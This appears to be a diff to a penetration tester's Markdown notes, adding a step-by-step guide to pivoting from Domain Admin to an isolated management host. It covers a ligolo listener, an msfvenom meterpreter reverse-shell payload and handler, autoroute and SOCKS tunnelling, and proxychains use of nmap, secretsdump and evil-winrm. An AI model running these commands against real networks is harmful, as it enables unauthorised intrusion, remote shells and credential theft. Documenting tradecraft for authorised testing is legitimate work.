@@ -431,6 +431,82 @@ sudo impacket-ntlmrelayx -t ldap://<dc-ip> -smb2support
 python3 printerbug.py <DOMAIN>/<user>:<pass>@<vuln-host> <kali-ip>
 ```
 
+### Double-Hop: DA → Isolated Management Host (MGT01)
+
+The common post-DA scenario: you have Domain Admin, but the client's actual objective is a specific box (e.g. `MGT01`) that sits behind the DC on a management subnet Kali can't reach. Ligolo alone gets you to the DC; from the DC to MGT01 needs a second tunnel.
+
+The chain: **Kali ↔ ligolo tunnel ↔ DC ↔ meterpreter+autoroute+SOCKS ↔ MGT01**.
+
+#### 1. Ligolo listener on the DC-side pivot (forwards a port back to Kali)
+
+In your existing ligolo session for the first pivot:
+
+```
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+```
+
+This gives you an inbound reverse-shell path *from* the DC back to Kali on port 11601.
+
+#### 2. Drop a meterpreter on the DC (through evil-winrm as DA)
+
+```bash
+## Kali — build the payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+         LHOST=<internal_pivot1_ip> LPORT=4444 \
+         -f exe -o shell.exe
+```
+
+Upload `shell.exe` to the DC via evil-winrm (`upload shell.exe`).
+
+#### 3. Handler on Kali
+
+```
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+run
+```
+
+Then in the evil-winrm shell on the DC, run `shell.exe`. Meterpreter session lands.
+
+#### 4. Autoroute into the MGT01 subnet, expose as SOCKS
+
+```
+## Inside the meterpreter session
+run post/multi/manage/autoroute        ## discovers connected subnets and adds them
+background
+
+## Back at msf prompt
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+```
+
+#### 5. Point proxychains at it
+
+Edit `/etc/proxychains4.conf` — comment out any existing socks lines and add at the bottom:
+
+```
+socks5 127.0.0.1 1080
+```
+
+#### 6. Attack MGT01 from Kali via proxychains
+
+```bash
+proxychains nmap -sT -Pn -sV -p 445,3389,5985 <MGT01-ip>
+proxychains impacket-secretsdump <DOMAIN>/Administrator:'<pass>'@<MGT01-ip>
+proxychains evil-winrm -i <MGT01-ip> -u Administrator -p '<pass>'
+```
+
+**Reminders:**
+- Nmap over proxychains MUST be `-sT` (full connect scan) — SYN scans don't survive the SOCKS hop.
+- Any tool that spawns its own child processes (`msfconsole` targeting an internal IP) doesn't need proxychains — it uses the autoroute directly. Only external tools (nmap, evil-winrm, impacket, xfreerdp) need proxychains.
+- If MGT01 is Windows and you want RDP: `proxychains xfreerdp /v:<MGT01-ip> /u:Administrator /p:'<pass>' /cert:ignore`.
+
 ### See Also
 - [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — the credential/hash you need to authenticate.
 - [Kerberos Attacks](./03-kerberos-attacks.md) — ticket-based variants of the above.
